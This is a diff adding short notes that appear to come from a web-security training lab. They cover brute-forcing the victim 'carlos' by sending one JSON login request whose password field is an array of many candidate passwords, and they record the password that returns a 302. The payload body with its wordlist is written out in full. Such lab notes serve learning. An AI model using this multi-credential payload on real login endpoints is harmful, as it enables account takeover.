@@ -1,0 +1,21 @@
+Vulnerable - Multiple credentials per request
+
+Goals:
+1- Brute-force carlos password.
+2- Access carlos account page.
+
+Victim username: carlos
+
+Analysis:
+--------
+
+{"username":"carlos","password": ["§jessica§","§pepper§","§1111§","§zxcvbn§","§555555§","§11111111§","§131313§","§freedom§","§777777§","§pass§","§maggie§","§159753§","§aaaaaa§","§ginger§","§princess§","§joshua§","§cheese§","§amanda§","§summer§"]}
+
+set the password to a list of passwords
+
+Enumerate the password of carlos
+
+Password hockey -> 302 response
+
+Username: carlos
+Password: hockey
